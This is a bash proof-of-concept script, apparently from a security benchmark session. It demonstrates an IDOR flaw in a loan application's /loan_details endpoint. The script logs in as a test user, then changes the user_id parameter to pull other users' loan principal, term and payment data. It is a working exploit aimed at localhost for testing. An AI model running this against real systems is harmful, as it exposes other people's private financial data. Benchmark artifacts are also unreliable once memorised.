#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /loan_details endpoint allowing unauthorized access to other users' loan information by manipulating user_id parameter
# Target: ./repo
# Created: 2025-11-04T19:40:07.466Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# IDOR - Unauthorized Access to Other Users' Loan Details POC
# This script demonstrates how an authenticated user can access other users' loan details
# by manipulating the user_id URL parameter without proper authorization checks

TARGET_URL="${1:-http://localhost:5000}"
COOKIES_FILE="/tmp/idor_test_cookies.txt"

echo "=========================================="
echo "IDOR Vulnerability POC - Loan Details"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Login as test user
echo "[*] Step 1: Authenticating as 'test' user..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

if echo "$LOGIN_RESPONSE" | grep -q "redirect\|success\|dashboard"; then
  echo "[+] Login successful"
else
  echo "[-] Login may have failed. Response: $LOGIN_RESPONSE"
fi

echo ""
echo "[*] Step 2: Accessing loan details for own user (no user_id parameter)..."
OWN_DATA=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/loan_details")
echo "[+] Response:"
echo "$OWN_DATA" | grep -o '"principal":[^,]*\|"term":[^,]*\|"monthly_payment":[^,]*' | head -3
echo ""

# Step 3: Access loan details with user_id=1
echo "[*] Step 3: Attempting IDOR - Accessing loan details with user_id=1..."
USER1_DATA=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/loan_details?user_id=1")
echo "[+] Response for user_id=1:"
echo "$USER1_DATA" | grep -o '"principal":[^,]*\|"term":[^,]*\|"monthly_payment":[^,]*' | head -3
echo ""

# Step 4: Access loan details with user_id=2
echo "[*] Step 4: Attempting IDOR - Accessing loan details with user_id=2..."
USER2_DATA=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/loan_details?user_id=2")
echo "[+] Response for user_id=2:"
echo "$USER2_DATA" | grep -o '"principal":[^,]*\|"term":[^,]*\|"monthly_payment":[^,]*' | head -3
echo ""

# Step 5: Access loan details with user_id=3
echo "[*] Step 5: Attempting IDOR - Accessing loan details with user_id=3..."
USER3_DATA=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/loan_details?user_id=3")
echo "[+] Response for user_id=3:"
echo "$USER3_DATA" | grep -o '"principal":[^,]*\|"term":[^,]*\|"monthly_payment":[^,]*' | head -3
echo ""

# Step 6: Verify IDOR vulnerability by checking if data differs
echo "[*] Step 6: Vulnerability Analysis..."
if [ "$OWN_DATA" != "$USER1_DATA" ] && [ ! -z "$USER1_DATA" ]; then
  echo "[+] VULNERABILITY CONFIRMED: Different data returned for different user_ids"
  echo "[+] This indicates successful unauthorized access to other users' loan details"
  echo ""
  echo "[*] Data Comparison:"
  echo "    Own user data:  $(echo "$OWN_DATA" | grep -o '"principal":[^,]*' | head -1)"
  echo "    User 1 data:    $(echo "$USER1_DATA" | grep -o '"principal":[^,]*' | head -1)"
  echo "    User 2 data:    $(echo "$USER2_DATA" | grep -o '"principal":[^,]*' | head -1)"
  echo "    User 3 data:    $(echo "$USER3_DATA" | grep -o '"principal":[^,]*' | head -1)"
else
  echo "[-] Could not confirm vulnerability - responses may be identical or empty"
fi

echo ""
echo "[*] Cleanup: Removing temporary cookie file..."
rm -f "$COOKIES_FILE"
echo "[+] POC Complete"